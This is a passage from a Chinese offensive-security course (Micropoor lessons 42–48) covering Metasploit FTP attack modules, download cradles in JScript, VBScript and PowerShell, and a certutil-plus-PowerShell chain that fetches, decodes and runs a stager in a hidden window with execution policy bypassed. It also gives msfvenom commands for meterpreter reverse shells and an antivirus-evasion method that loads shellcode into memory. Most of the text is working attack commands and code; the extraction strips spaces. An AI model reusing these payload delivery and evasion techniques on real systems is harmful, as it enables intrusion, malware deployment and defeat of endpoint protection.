-289-
本文档使用书栈(BookStack.CN)构建
在办公区的内网中，充斥着大量的ftp文件服务器。其中不乏有部分敏感文件，也许有你需要的密码
文件，也许有任务中的目标文件等。本季从讲述内网ftp服务器的发现以及常用的相关模块。
靶机介绍：
靶机一：Windows2003|192.168.1.115
靶机二：Debian|192.168.1.5
msf内置search模块，在实战中，为了更快速的找到对应模块，它提供了type参数（未来会具
体讲到模块参数），以ftp模块为例。
1. msf>searchtype:auxiliaryftp
2.
3. MatchingModules
4. ================
5.
6. NameDisclosureDateRankDescription
7. ----------------------------------
8. auxiliary/admin/cisco/vpn_3000_ftp_bypass2006-08-23normalCiscoVPN
Concentrator3000FTPUnauthorizedAdministrativeAccess
9. auxiliary/admin/officescan/tmlisten_traversalnormalTrendMicroOfficeScanNT
ListenerTraversalArbitraryFileAccess
10. auxiliary/admin/tftp/tftp_transfer_utilnormalTFTPFileTransferUtility
11. auxiliary/dos/scada/d20_tftp_overflow2012-01-19normalGeneralElectricD20ME
TFTPServerBufferOverflowDoS
12. auxiliary/dos/windows/ftp/filezilla_admin_user2005-11-07normalFileZillaFTP
ServerAdminInterfaceDenialofService
13. ......
auxiliary/scanner/ftp/ftp_version
第四十二课：攻击FTP服务
-290-
本文档使用书栈(BookStack.CN)构建
auxiliary/scanner/ftp/ftp_login
auxiliary/scanner/ftp/anonymous
第四十二课：攻击FTP服务
-291-
本文档使用书栈(BookStack.CN)构建
当然msf也内置了nmap，来内网大量发现FTP存活主机，参数与使用与nmap一致。
1. msfauxiliary(scanner/ftp/anonymous)>db_nmap-sS-T4-p21192.168.1.115
msf更多针对了ftpd。
第四十二课：攻击FTP服务
-292-
本文档使用书栈(BookStack.CN)构建
关于ftp的本地fuzzer，更推荐的是本地fuzz，msf做辅助poc。
ftp本地模糊测试辅助模块：
auxiliary/fuzzers/ftp/ftp_pre_post
第四十二课：攻击FTP服务
-293-
本文档使用书栈(BookStack.CN)构建
关于后期利用，poc编写，在未来的季中会继续讲述。
Micropoor
第四十二课：攻击FTP服务
-294-
本文档使用书栈(BookStack.CN)构建
windows全版本都会默认支持js，并且通过cscript来调用达到下载payload的目的。
靶机：windows2003
1. C:\test>cscript/nologodownfile.jshttp://192.168.1.115/robots.txt
1. varWinHttpReq=newActiveXObject("WinHttp.WinHttpRequest.5.1");
2. WinHttpReq.Open("GET",WScript.Arguments(0),/*async=*/false);
3. WinHttpReq.Send();
4. WScript.Echo(WinHttpReq.ResponseText);
1. C:\test>cscript/nologodowfile2.jshttp://192.168.1.115/robots.txt
读取：
附代码：
写入：
第四十三课：js一句话下载payload
-295-
本文档使用书栈(BookStack.CN)构建
1. varWinHttpReq=newActiveXObject("WinHttp.WinHttpRequest.5.1");
2. WinHttpReq.Open("GET",WScript.Arguments(0),/*async=*/false);
3. WinHttpReq.Send();
4.
5. BinStream=newActiveXObject("ADODB.Stream");BinStream.Type=1;
6.
7. BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);
8. BinStream.SaveToFile("micropoor.exe");
后者的话：简单，易用，轻便。
Micropoor
附代码：
第四十三课：js一句话下载payload
-296-
本文档使用书栈(BookStack.CN)构建
第八季中提到了certutil的加密与解密。
1. C:\>certutil-encodec:\downfile.vbsdownfile.bat
而配合powershell的内存加载，则可把certutil发挥更强大。
靶机：windows2012
而今天需要的是一款powershell的混淆框架的配合
https://github.com/danielbohannon/Invoke-CradleCrafter
使用方法：
1. Import-Module./Invoke-CradleCrafter.psd1Invoke-CradleCrafter
如果在加载powershell脚本的时候提示：powershell
进行数字签运行该脚本。
则先执行：
1. set-executionpolicyBypass
第四十四课：ertutil一句话下载payload补充
-297-
本文档使用书栈(BookStack.CN)构建
生成payload：（有关生成payload，会在未来的系列中讲到）
1. root@John:/tmp#msfvenom‐pwindows/x64/meterpreter/reverse_tcp
LHOST=192.168.1.5LPORT=53‐ecmd/powershell_base64‐fpsh‐oMicropoor.txt
启动apache：
第四十四课：ertutil一句话下载payload补充
-298-
本文档使用书栈(BookStack.CN)构建
powershell框架设置：
SETURLhttp://192.168.1.5/Micropoor.txt
MEMORY
第四十四课：ertutil一句话下载payload补充
-299-
本文档使用书栈(BookStack.CN)构建
CERTUTIL
ALL
1
混淆内容保存txt，后进行encode
第四十四课：ertutil一句话下载payload补充
-300-
本文档使用书栈(BookStack.CN)构建
把cer.cer与Micropoo.txt放置同一目录下。
目标机执行：
1. powershell.exe‐WinhiddeN‐ExecByPasSadd‐content‐path%APPDATA%\\cer.cer
(New‐ObjectNet.WebClient).DownloadString('http://192.168.1.5/cer.cer');
certutil‐decode%APPDATA%\cer.cer%APPDATA%\stage.ps1&start/bcmd/c
powershell.exe‐ExecBypass‐NoExit‐File%APPDATA%\stage.ps1&start/bcmd/c
del%APPDATA%\cer.cer
Micropoor
第四十四课：ertutil一句话下载payload补充
-301-
本文档使用书栈(BookStack.CN)构建
实战中，需要用bat解决的事情总会碰到，而针对不同的环境，可能同一件事情需要不同的方案。
bat内容：追加到bat.txt里。
1. SetoShell=CreateObject("Wscript.Shell")
2. DimstrArgs
3. strArgs="cmd/cbat.bat"
4. oShell.RunstrArgs,0,false
但是代码过长，需要追加写入。需要简化下代码。
1. CreateObject("Wscript.Shell").Run"bat.bat",0,True
demo:测试bat
附代码：
附代码：
第四十五课：解决bat一句话下载payload黑窗
-302-
本文档使用书栈(BookStack.CN)构建
如果需要在目标机上执行多个bat，如果需要把代码中的bat.bat变成变量的话。
1. IfWScript.Arguments.Count>=1Then
2. ReDimarr(WScript.Arguments.Count‐1)
3. Fori=0ToWScript.Arguments.Count‐1
4. Arg=WScript.Arguments(i)
5. IfInStr(Arg,"")>0ThenArg=""""&Arg&""""
6. arr(i)=Arg
7. Next
8.
9. RunCmd=Join(arr)
10. CreateObject("Wscript.Shell").RunRunCmd,0,True
11. EndIf
Micropoor
附代码：
第四十五课：解决bat一句话下载payload黑窗
-303-
本文档使用书栈(BookStack.CN)构建
自Windows7以后内置了powershell，如Windows7中内置了PowerShell2.0,Windows
8中内置了PowerShell3.0。
靶机：windows7
powershell$PSVersionTable
基于System.Net.WebClient
1. $Urls=@()
2. $Urls+="http://192.168.1.115/robots.txt"
down.ps1:
附：
第四十六课：powershell一句话下载payload
-304-
本文档使用书栈(BookStack.CN)构建
3. $OutPath="E:\PDF\"
4. ForEach($itemin$Urls){
5. $file=$OutPath+($item).split('/')[-1]
6. (New-ObjectSystem.Net.WebClient).DownloadFile($item,$file)
7. }
靶机：windows2012
powershell$PSVersionTable
在powershell3.0以后，提供wget功能，既Invoke-WebRequest
C:\inetpub>powershellC:\inetpub\down.ps1
注：需要绝对路径。
down.ps1:
第四十六课：powershell一句话下载payload
-305-
本文档使用书栈(BookStack.CN)构建
1. $url="http://192.168.1.115/robots.txt"
2. $output="C:\inetpub\robots.txt"
3. $start_time=Get-Date
4. Invoke-WebRequest-Uri$url-OutFile$output
5. Write-Output"Time:$((Get-Date).Subtract($start_time).Seconds)second(s)"
当然也可以一句话执行下载：
1. powershell-execbypass-c(new-object
System.Net.WebClient).DownloadFile('http://192.168.1.115/robots.txt','E:\robots.txt'
附：
第四十六课：powershell一句话下载payload
-306-
本文档使用书栈(BookStack.CN)构建
Micropoor
第四十六课：powershell一句话下载payload
-307-
本文档使用书栈(BookStack.CN)构建
目前的反病毒安全软件，常见有三种，一种基于特征，一种基于行为，一种基于云查杀。云查杀的特点
基本也可以概括为特征查杀。无论是哪种，都是特别针对PE头文件的查杀。尤其是当payload文
件越大的时候，特征越容易查杀。
既然知道了目前的主流查杀方式，那么反制查杀，此篇采取特征与行为分离免杀。避免PE头文件，并
且分离行为，与特征的综合免杀。适用于菜刀下等场景，也是我在基于windows下为了更稳定的一种
常用手法。载入内存。
1. msfvenom-pwindows/x64/meterpreter/reverse_tcplhost=192.168.1.5lport=8080-e
x86/shikata_ga_nai-i5-fraw>test.c
0x00:以msf为例：监听端口
0x01：这里的payload不采取生成pe文件，而采取shellcode方式，
来借助第三方直接加载到内存中。避免行为：
第四十七课：payload分离免杀思路
-308-
本文档使用书栈(BookStack.CN)构建
https://github.com/clinicallyinane/shellcode_launcher/
作者的话：建议大家自己写shellcode执行盒，相关代码网上非常成熟。如果遇到问题，随时可以问
我。
生成的payload大小如下：476字节。还是X32位的payload。
0x02:既然是shellcode方式的payload，那么一定需要借助第三方来
启动，加载到内存。执行shellcode，自己写也不是很难，这里我借用
一个github一个开源：
第四十七课：payload分离免杀思路
-309-
本文档使用书栈(BookStack.CN)构建
国内世界杀毒网：
第四十七课：payload分离免杀思路
-310-
本文档使用书栈(BookStack.CN)构建
国际世界杀毒网：
第四十七课：payload分离免杀思路
-311-
本文档使用书栈(BookStack.CN)构建
上线成功。
Micropoor
第四十七课：payload分离免杀思路
-312-
本文档使用书栈(BookStack.CN)构建
payload分离免杀思路第一季是专门针对x32系统，以及针对xp包括以下版本。而在实战中，目
标机器多为Windows7以上版本。而服务器以x64位居多。在第一季中，借助了非微软自带第三方
来执行Shellcode，这一季采取调用微软自带来执行Shellcode，这里就会有一个好处，调用自带
本身一定就会有微软的签名，从而绕过反病毒软件。
Windows自WindowsXPMediaCenterEdition开始默认安装NETFramework，直至目前
的Windows10，最新的默认版本为4.6.00081.00。随着装机量，最新默认安装版本为
4.7.2053.0。
C#的在Windows平台下的编译器名称是Csc.exe，如果你的.NETFrameWorkSDK安装在C